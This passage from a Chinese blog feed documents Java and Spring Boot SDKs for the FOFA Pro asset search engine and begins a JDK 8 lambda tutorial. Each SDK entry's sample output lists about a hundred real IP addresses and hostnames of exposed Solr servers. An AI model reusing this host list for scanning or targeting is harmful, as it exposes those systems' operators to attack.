        <content type="html"><![CDATA[<h2 id="开源地址"><a href="#开源地址" class="headerlink" title="开源地址"></a>开源地址</h2><p><a href="https://github.com/fofapro/fofa-spring-boot-starter" target="_blank" rel="noopener">https://github.com/fofapro/fofa-spring-boot-starter</a></p><h2 id="FOFA-Pro-API"><a href="#FOFA-Pro-API" class="headerlink" title="FOFA Pro API"></a>FOFA Pro API</h2><p><a href="https://fofa.so/api" target="_blank" rel="noopener"><code>FOFA Pro API</code></a> 是资产搜索引擎 <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> 为开发者提供的 <code>RESTful API</code> 接口, 允许开发者在自己的项目中集成 <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> 的功能。</p><h2 id="FOFA-SDK"><a href="#FOFA-SDK" class="headerlink" title="FOFA SDK"></a>FOFA SDK</h2><p>基于 <a href="https://fofa.so/api" target="_blank" rel="noopener"><code>FOFA Pro API</code></a> 编写的 <code>Spring Boot</code> 版 <code>SDK</code>, 方便 java 开发者快速将 <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> 集成到自己的项目中。</p><h2 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h2><h3 id="Apache-Maven"><a href="#Apache-Maven" class="headerlink" title="Apache Maven"></a>Apache Maven</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.r4v3zn.fofa&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;fofa-spring-boot-starter&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="Gradle-Groovy-DSL"><a href="#Gradle-Groovy-DSL" class="headerlink" title="Gradle Groovy DSL"></a>Gradle Groovy DSL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation <span class="string">'com.r4v3zn.fofa:fofa-spring-boot-starter:1.0.0'</span></span><br></pre></td></tr></table></figure><h3 id="Gradle-Kotlin-DSL"><a href="#Gradle-Kotlin-DSL" class="headerlink" title="Gradle Kotlin DSL"></a>Gradle Kotlin DSL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile(<span class="string">"com.r4v3zn.fofa:fofa-spring-boot-starter:1.0.0"</span>)</span><br></pre></td></tr></table></figure><h3 id="Scala-SBT"><a href="#Scala-SBT" class="headerlink" title="Scala SBT"></a>Scala SBT</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libraryDependencies += <span class="string">"com.r4v3zn.fofa"</span> % <span class="string">"fofa-spring-boot-starter"</span> % <span class="string">"1.0.0"</span></span><br></pre></td></tr></table></figure><h3 id="Apache-Ivy"><a href="#Apache-Ivy" class="headerlink" title="Apache Ivy"></a>Apache Ivy</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency org=<span class="string">"com.r4v3zn.fofa"</span> name=<span class="string">"fofa-spring-boot-starter"</span> rev=<span class="string">"1.0.0"</span> /&gt;</span><br></pre></td></tr></table></figure><h3 id="Groovy-Grape"><a href="#Groovy-Grape" class="headerlink" title="Groovy Grape"></a>Groovy Grape</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Grapes</span>(</span><br><span class="line">  <span class="meta">@Grab</span>(group=<span class="string">'com.r4v3zn.fofa'</span>, <span class="keyword">module</span>=<span class="string">'fofa-spring-boot-starter'</span>, version=<span class="string">'1.0.0'</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="Leiningen"><a href="#Leiningen" class="headerlink" title="Leiningen"></a>Leiningen</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[com.r4v3zn.fofa/fofa-spring-boot-starter <span class="string">"1.0.0"</span>]</span><br></pre></td></tr></table></figure><h3 id="Apache-Buildr"><a href="#Apache-Buildr" class="headerlink" title="Apache Buildr"></a>Apache Buildr</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'com.r4v3zn.fofa:fofa-spring-boot-starter:jar:1.0.0'</span></span><br></pre></td></tr></table></figure><h3 id="Maven-Central-Badge"><a href="#Maven-Central-Badge" class="headerlink" title="Maven Central Badge"></a>Maven Central Badge</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[![Maven Central](https:<span class="comment">//img.shields.io/maven-central/v/com.r4v3zn.fofa/fofa-spring-boot-starter.svg?label=Maven%20Central)](https://search.maven.org/search?q=g:%22com.r4v3zn.fofa%22%20AND%20a:%22fofa-spring-boot-starter%22)</span></span><br></pre></td></tr></table></figure><h3 id="PURL"><a href="#PURL" class="headerlink" title="PURL"></a>PURL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg:maven/com.r4v3zn.fofa/fofa-spring-boot-starter@<span class="number">1.0</span>.0</span><br></pre></td></tr></table></figure><h3 id="Bazel"><a href="#Bazel" class="headerlink" title="Bazel"></a>Bazel</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">maven_jar(</span><br><span class="line">    name = <span class="string">"fofa-spring-boot-starter"</span>,</span><br><span class="line">    artifact = <span class="string">"com.r4v3zn.fofa:fofa-spring-boot-starter:1.0.0"</span>,</span><br><span class="line">    sha1 = <span class="string">"41b8264a15fcd137652d5194603ee4ce661d55e0"</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><table><thead><tr><th style="text-align:center">字段名称</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>email</code></td><td style="text-align:center">用户登陆 <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> 使用的 <code>Email</code></td></tr><tr><td style="text-align:center"><code>key</code></td><td style="text-align:center">前往 <a href="https://fofa.so/user/users/info" target="_blank" rel="noopener"><code>个人中心</code></a> 查看 <code>API Key</code></td></tr></tbody></table><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>需要配置项目中的<code>application.yml</code>或<code>application.properties</code>文件。</p><h4 id="application-yml"><a href="#application-yml" class="headerlink" title="application.yml"></a>application.yml</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">fofa:</span></span><br><span class="line"><span class="attr">  email:</span> </span><br><span class="line"><span class="attr">  key:</span></span><br></pre></td></tr></table></figure><h4 id="application-properties"><a href="#application-properties" class="headerlink" title="application.properties"></a>application.properties</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fofa.email=</span><br><span class="line">fofa.key=</span><br></pre></td></tr></table></figure><h3 id="获取用户信息"><a href="#获取用户信息" class="headerlink" title="获取用户信息"></a>获取用户信息</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> FofaClient client;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    System.out.println(client.getUser());</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取FOFA-Pro-搜索结果"><a href="#获取FOFA-Pro-搜索结果" class="headerlink" title="获取FOFA Pro 搜索结果"></a>获取FOFA Pro 搜索结果</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> FofaClient client;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String q = <span class="string">"app=\"Solr\""</span>;</span><br><span class="line">    System.out.println(client.getData(q));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FofaData&#123;mode=<span class="string">'extended'</span>, page=<span class="number">1</span>, size=<span class="number">8578</span>, totalPage=<span class="number">86</span>, query=<span class="string">'app="Solr"'</span>, results=[<span class="number">52.204</span>.201.10:<span class="number">8080</span>, <span class="number">39.106</span>.133.253:<span class="number">8081</span>, <span class="number">168.61</span>.45.247:<span class="number">3000</span>, <span class="number">185.145</span>.32.101:<span class="number">9090</span>, <span class="number">47.92</span>.153.193:<span class="number">8083</span>, https:<span class="comment">//54.177.198.16:9443, https://46.137.115.176, 109.202.145.150:9090, 18.229.36.175, https://52.65.18.222, 94.103.24.81, 128.119.168.198:8080, 45.56.107.121:8090, 159.65.33.96:8080, 165.28.246.132, 34.205.15.100:8080, 3.89.155.86, 101.200.142.15:8099, 45.56.91.166:8090, 107.21.102.229, 89.28.161.145:8083, 35.165.137.220, 162.243.2.73:32768, 3.82.255.95:8080, 52.22.6.26, 96.126.97.74:8090, https://solr.swoonery.com, 63.34.225.181:8083, 18.223.238.90:7777, 167.99.252.65:8081, 18.232.114.197, 96.126.104.116:8090, 52.17.255.254, 101.201.145.141:8888, 13.228.98.189, 52.66.197.212:8081, 34.226.45.218:9443, 36.111.196.193:8082, 52.80.87.182, 97.107.133.44:8090, 173.255.217.135:8080, 34.199.97.120:8081, 52.17.131.156, https://13.55.200.182:443, 23.23.104.210, 54.68.95.160, https://54.77.13.29:8082, 66.175.209.109:8090, 52.200.107.211:8080, 104.130.124.46:7777, 192.231.177.172:8090, 54.221.155.2, 203.135.191.199:8080, 218.93.127.8:9080, 101.251.241.194:8081, 115.79.204.120:8888, 39.106.23.13:8180, https://52.16.231.131:8080, 52.5.53.165:8080, 39.106.180.220:8180, 52.67.86.138, https://52.26.130.143, 52.37.105.68, 23.239.19.16:8090, 52.58.193.2, 168.218.15.134, 52.44.108.125:9443, 76.210.250.82:32768, 52.71.163.53, 92.243.20.10:8080, 157.249.39.129, www.marineparts.us:8983, 185.135.12.139:8080, 123.207.239.114:8082, 66.175.209.253:8090, 66.175.209.38:8090, 173.255.223.210:8090, 14.29.118.239:20000, 70.142.24.61:8080, 3.87.173.6:8001, 47.107.106.243:20000, 101.201.117.191, 118.190.215.162, 116.203.141.150:8080, 58.250.149.11:8085, 3.88.123.255, 173.255.216.58:8090, 14.139.13.78:8080, 54.149.94.198, 142.93.183.248:8082, 216.47.157.209:8090, 202.202.240.113:7777, 198.101.238.25:8080, 52.66.72.8:8888, 92.243.20.10:8081, 23.239.23.20:8090, 39.107.94.23:8888, 79.137.82.228:8083, 120.55.191.189:8010, 52.21.16.23:8080]&#125;</span></span><br></pre></td></tr></table></figure><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><p>2019-06-17</p><pre><code>- 开源</code></pre>]]></content>
      
      
      <categories>
          
          <category> FOFA Pro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FOFA Pro </tag>
            
            <tag> Spring Boot </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FOFA Pro java SDK</title>
      <link href="/posts/82f84ad1/"/>
      <url>/posts/82f84ad1/</url>
      
        <content type="html"><![CDATA[<h2 id="开源地址"><a href="#开源地址" class="headerlink" title="开源地址"></a>开源地址</h2><p><a href="https://github.com/fofapro/fofa-java" target="_blank" rel="noopener">https://github.com/fofapro/fofa-java</a></p><h2 id="FOFA-Pro-API"><a href="#FOFA-Pro-API" class="headerlink" title="FOFA Pro API"></a>FOFA Pro API</h2><p><a href="https://fofa.so/api" target="_blank" rel="noopener"><code>FOFA Pro API</code></a> 是资产搜索引擎 <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> 为开发者提供的 <code>RESTful API</code> 接口, 允许开发者在自己的项目中集成 <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> 的功能。</p><h2 id="FOFA-SDK"><a href="#FOFA-SDK" class="headerlink" title="FOFA SDK"></a>FOFA SDK</h2><p>基于 <a href="https://fofa.so/api" target="_blank" rel="noopener"><code>FOFA Pro API</code></a> 编写的 <code>java</code> 版 <code>SDK</code>, 方便 java 开发者快速将 <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> 集成到自己的项目中。</p><h2 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h2><h3 id="Apache-Maven"><a href="#Apache-Maven" class="headerlink" title="Apache Maven"></a>Apache Maven</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;com.r4v3zn.fofa&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;fofa-core&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;1.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="Gradle-Groovy-DSL"><a href="#Gradle-Groovy-DSL" class="headerlink" title="Gradle Groovy DSL"></a>Gradle Groovy DSL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implementation <span class="string">'com.r4v3zn.fofa:fofa-core:1.0.0'</span></span><br></pre></td></tr></table></figure><h3 id="Gradle-Kotlin-DSL"><a href="#Gradle-Kotlin-DSL" class="headerlink" title="Gradle Kotlin DSL"></a>Gradle Kotlin DSL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile(<span class="string">"com.r4v3zn.fofa:fofa-core:1.0.0"</span>)</span><br></pre></td></tr></table></figure><h3 id="Scala-SBT"><a href="#Scala-SBT" class="headerlink" title="Scala SBT"></a>Scala SBT</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libraryDependencies += <span class="string">"com.r4v3zn.fofa"</span> % <span class="string">"fofa-core"</span> % <span class="string">"1.0.0"</span></span><br></pre></td></tr></table></figure><h3 id="Apache-Ivy"><a href="#Apache-Ivy" class="headerlink" title="Apache Ivy"></a>Apache Ivy</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency org=<span class="string">"com.r4v3zn.fofa"</span> name=<span class="string">"fofa-core"</span> rev=<span class="string">"1.0.0"</span> /&gt;</span><br></pre></td></tr></table></figure><h3 id="Groovy-Grape"><a href="#Groovy-Grape" class="headerlink" title="Groovy Grape"></a>Groovy Grape</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Grapes</span>(</span><br><span class="line">  <span class="meta">@Grab</span>(group=<span class="string">'com.r4v3zn.fofa'</span>, <span class="keyword">module</span>=<span class="string">'fofa-core'</span>, version=<span class="string">'1.0.0'</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="Leiningen"><a href="#Leiningen" class="headerlink" title="Leiningen"></a>Leiningen</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[com.r4v3zn.fofa/fofa-core <span class="string">"1.0.0"</span>]</span><br></pre></td></tr></table></figure><h3 id="Apache-Buildr"><a href="#Apache-Buildr" class="headerlink" title="Apache Buildr"></a>Apache Buildr</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'com.r4v3zn.fofa:fofa-core:jar:1.0.0'</span></span><br></pre></td></tr></table></figure><h3 id="Maven-Central-Badge"><a href="#Maven-Central-Badge" class="headerlink" title="Maven Central Badge"></a>Maven Central Badge</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[![Maven Central](https:<span class="comment">//img.shields.io/maven-central/v/com.r4v3zn.fofa/fofa-core.svg?label=Maven%20Central)](https://search.maven.org/search?q=g:%22com.r4v3zn.fofa%22%20AND%20a:%22fofa-core%22)</span></span><br></pre></td></tr></table></figure><h3 id="PURL"><a href="#PURL" class="headerlink" title="PURL"></a>PURL</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg:maven/com.r4v3zn.fofa/fofa-core@<span class="number">1.0</span>.0</span><br></pre></td></tr></table></figure><h3 id="Bazel"><a href="#Bazel" class="headerlink" title="Bazel"></a>Bazel</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">maven_jar(</span><br><span class="line">    name = <span class="string">"fofa-core"</span>,</span><br><span class="line">    artifact = <span class="string">"com.r4v3zn.fofa:fofa-core:1.0.0"</span>,</span><br><span class="line">    sha1 = <span class="string">"93b888a1d1c42c696f60f246585609d66f72eb8b"</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><table><thead><tr><th style="text-align:center">字段名称</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center"><code>email</code></td><td style="text-align:center">用户登陆 <a href="https://fofa.so" target="_blank" rel="noopener"><code>FOFA Pro</code></a> 使用的 <code>Email</code></td></tr><tr><td style="text-align:center"><code>key</code></td><td style="text-align:center">前往 <a href="https://fofa.so/user/users/info" target="_blank" rel="noopener"><code>个人中心</code></a> 查看 <code>API Key</code></td></tr></tbody></table><h3 id="获取用户信息"><a href="#获取用户信息" class="headerlink" title="获取用户信息"></a>获取用户信息</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// FOFA Pro email</span></span><br><span class="line">    String email = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// FOFA Pro key</span></span><br><span class="line">    String key = <span class="string">""</span>;</span><br><span class="line">    FofaClient client = <span class="keyword">new</span> FofaClient(email, key);</span><br><span class="line">    System.out.println(client.getUser());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取FOFA-Pro-搜索结果"><a href="#获取FOFA-Pro-搜索结果" class="headerlink" title="获取FOFA Pro 搜索结果"></a>获取FOFA Pro 搜索结果</h3><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// FOFA Pro email</span></span><br><span class="line">    String email = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// FOFA Pro key</span></span><br><span class="line">    String key = <span class="string">""</span>;</span><br><span class="line">    String q = <span class="string">"app=\"Solr\""</span>;</span><br><span class="line">    FofaClient client = <span class="keyword">new</span> FofaClient(email, key);</span><br><span class="line">    System.out.println(client.getData(q));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FofaData&#123;mode=<span class="string">'extended'</span>, page=<span class="number">1</span>, size=<span class="number">8578</span>, totalPage=<span class="number">86</span>, query=<span class="string">'app="Solr"'</span>, results=[<span class="number">52.204</span>.201.10:<span class="number">8080</span>, <span class="number">39.106</span>.133.253:<span class="number">8081</span>, <span class="number">168.61</span>.45.247:<span class="number">3000</span>, <span class="number">185.145</span>.32.101:<span class="number">9090</span>, <span class="number">47.92</span>.153.193:<span class="number">8083</span>, https:<span class="comment">//54.177.198.16:9443, https://46.137.115.176, 109.202.145.150:9090, 18.229.36.175, https://52.65.18.222, 94.103.24.81, 128.119.168.198:8080, 45.56.107.121:8090, 159.65.33.96:8080, 165.28.246.132, 34.205.15.100:8080, 3.89.155.86, 101.200.142.15:8099, 45.56.91.166:8090, 107.21.102.229, 89.28.161.145:8083, 35.165.137.220, 162.243.2.73:32768, 3.82.255.95:8080, 52.22.6.26, 96.126.97.74:8090, https://solr.swoonery.com, 63.34.225.181:8083, 18.223.238.90:7777, 167.99.252.65:8081, 18.232.114.197, 96.126.104.116:8090, 52.17.255.254, 101.201.145.141:8888, 13.228.98.189, 52.66.197.212:8081, 34.226.45.218:9443, 36.111.196.193:8082, 52.80.87.182, 97.107.133.44:8090, 173.255.217.135:8080, 34.199.97.120:8081, 52.17.131.156, https://13.55.200.182:443, 23.23.104.210, 54.68.95.160, https://54.77.13.29:8082, 66.175.209.109:8090, 52.200.107.211:8080, 104.130.124.46:7777, 192.231.177.172:8090, 54.221.155.2, 203.135.191.199:8080, 218.93.127.8:9080, 101.251.241.194:8081, 115.79.204.120:8888, 39.106.23.13:8180, https://52.16.231.131:8080, 52.5.53.165:8080, 39.106.180.220:8180, 52.67.86.138, https://52.26.130.143, 52.37.105.68, 23.239.19.16:8090, 52.58.193.2, 168.218.15.134, 52.44.108.125:9443, 76.210.250.82:32768, 52.71.163.53, 92.243.20.10:8080, 157.249.39.129, www.marineparts.us:8983, 185.135.12.139:8080, 123.207.239.114:8082, 66.175.209.253:8090, 66.175.209.38:8090, 173.255.223.210:8090, 14.29.118.239:20000, 70.142.24.61:8080, 3.87.173.6:8001, 47.107.106.243:20000, 101.201.117.191, 118.190.215.162, 116.203.141.150:8080, 58.250.149.11:8085, 3.88.123.255, 173.255.216.58:8090, 14.139.13.78:8080, 54.149.94.198, 142.93.183.248:8082, 216.47.157.209:8090, 202.202.240.113:7777, 198.101.238.25:8080, 52.66.72.8:8888, 92.243.20.10:8081, 23.239.23.20:8090, 39.107.94.23:8888, 79.137.82.228:8083, 120.55.191.189:8010, 52.21.16.23:8080]&#125;</span></span><br></pre></td></tr></table></figure><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><p>2019-06-12</p><pre><code>- 添加中文文档</code></pre><p>2019-06-11</p><pre><code>- 修改开发者信息- 删除hutool-http依赖</code></pre>]]></content>
      
      
      <categories>
          
          <category> FOFA Pro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FOFA Pro </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDK8函数编程</title>
      <link href="/posts/289368c1/"/>
      <url>/posts/289368c1/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Lambda"><a href="#什么是Lambda" class="headerlink" title="什么是Lambda"></a>什么是Lambda</h2><p>我们知道，对于一个Java变量，我们可以赋给其一个“值”。</p><p><img src="https://img.zhiiyun.com/v2-ab6545c49383236a4af3f28a47886090_hd.jpg" alt=""></p><p>如果你想把“一块代码”赋给一个Java变量，应该怎么做呢？</p><p>比如，我想把右边那块代码，赋给一个叫做aBlockOfCode的Java变量：</p><p><img src="https://img.zhiiyun.com/v2-1cc87e82fba0872c2cae3fee08e8fe41_hd.jpg" alt=""></p><p>在Java 8之前，这个是做不到的。但是Java 8问世之后，利用Lambda特性，就可以做到了。</p><p><img src="https://img.zhiiyun.com/v2-145a556d86806c3163391a13428e3f03_hd.jpg" alt=""></p><p>当然，这个并不是一个很简洁的写法。所以，为了使这个赋值操作更加elegant, 我们可以移除一些没用的声明。</p><p><img src="https://img.zhiiyun.com/v2-a712753b42972e094a548ae02fa82987_hd.jpg" alt=""></p><p>这样，我们就成功的非常优雅的把“一块代码”赋给了一个变量。而“这块代码”，或者说“这个被赋给一个变量的函数”，就是一个Lambda表达式。但是这里仍然有一个问题，就是变量aBlockOfCode的类型应该是什么？在Java 8里面，所有的Lambda的类型都是一个接口，而Lambda表达式本身，也就是”那段代码“，需要是这个接口的实现。这是我认为理解Lambda的一个关键所在，简而言之就是，Lambda表达式本身就是一个接口的实现。直接这样说可能还是有点让人困扰，我们继续看看例子。我们给上面的aBlockOfCode加上一个类型：</p><p><img src="https://img.zhiiyun.com/v2-55de66060b4cb70193ddc7fea201b257_hd.jpg" alt=""></p><p>这种只有一个接口函数需要被实现的接口类型，我们叫它”函数式接口“。为了避免后来的人在这个接口中增加接口函数导致其有多个接口函数需要被实现，变成”非函数接口”，我们可以在这个上面加上一个声明@FunctionalInterface, 这样别人就无法在里面添加新的接口函数了：</p><p><img src="https://img.zhiiyun.com/v2-2c57e7411de227d1eb09c327d01fb766_hd.jpg" alt=""></p><p>这样，我们就得到了一个完整的Lambda表达式声明：</p><p><img src="https://img.zhiiyun.com/v2-02eedc528fcee115f5ed0b7b045846d7_hd.jpg" alt=""></p><h2 id="Lambda表达式有什么作用"><a href="#Lambda表达式有什么作用" class="headerlink" title="Lambda表达式有什么作用?"></a>Lambda表达式有什么作用?</h2><p>最直观的作用就是使得代码变得异常简洁。</p><p>我们可以对比一下Lambda表达式和传统的Java对同一个接口的实现：</p><p><img src="https://img.zhiiyun.com/v2-dbd46cf9d188d0fde25db700c23dcc79_hd.jpg" alt=""></p><p>这两种写法本质上是等价的。但是显然，Java 8中的写法更加优雅简洁。并且，由于Lambda可以直接赋值给一个变量，我们就可以直接把Lambda作为参数传给函数, 而传统的Java必须有明确的接口实现的定义，初始化才行：</p><p><img src="https://img.zhiiyun.com/v2-28606f4328308baf7f70a36bd689e5ea_hd.jpg" alt=""></p><p>有些情况下，这个接口实现只需要用到一次。传统的Java 7必须要求你定义一个“污染环境”的接口实现MyInterfaceImpl，而相较之下Java 8的Lambda, 就显得干净很多。</p><h3 id="Lambda结合FunctionalInterface-Lib-forEach-stream-，method-reference等新特性可以使代码变的更加简洁！"><a href="#Lambda结合FunctionalInterface-Lib-forEach-stream-，method-reference等新特性可以使代码变的更加简洁！" class="headerlink" title="Lambda结合FunctionalInterface Lib, forEach, stream()，method reference等新特性可以使代码变的更加简洁！"></a>Lambda结合FunctionalInterface Lib, forEach, stream()，method reference等新特性可以使代码变的更加简洁！</h3><p>直接上例子。</p><p>假设Person的定义和List<person>的值都给定。</person></p><p><img src="https://img.zhiiyun.com/v2-02ae14b4c341e2303ae86e2da6a038a2_hd.jpg" alt=""></p><p>现在需要你打印出guiltyPersons List里面所有LastName以”Z”开头的人的FirstName。</p><p>原生态Lambda写法：定义两个函数式接口，定义一个静态函数，调用静态函数并给参数赋值Lambda表达式。</p><p><img src="https://img.zhiiyun.com/v2-fdef41934be8804fa244e89c84a567f1_hd.jpg" alt=""></p><p>这个代码实际上已经比较简洁了，但是我们还可以更简洁么？当然可以。在Java 8中有一个函数式接口的包，里面定义了大量可能用到的函数式接口（java.util.function (Java Platform SE 8 )）。所以，我们在这里压根都不需要定义NameChecker和Executor这两个函数式接口，直接用Java 8函数式接口包里的Predicate<t>和Consumer<t>就可以了——因为他们这一对的接口定义和NameChecker/Executor其实是一样的。<br>c</t></t></p><h4 id="第一步简化-利用函数式接口包："><a href="#第一步简化-利用函数式接口包：" class="headerlink" title="第一步简化 - 利用函数式接口包："></a>第一步简化 - 利用函数式接口包：</h4><p>静态函数里面的for each循环其实是非常碍眼的。这里可以利用Iterable自带的forEach()来替代。forEach()本身可以接受一个Consumer<t> 参数。</t></p><p><img 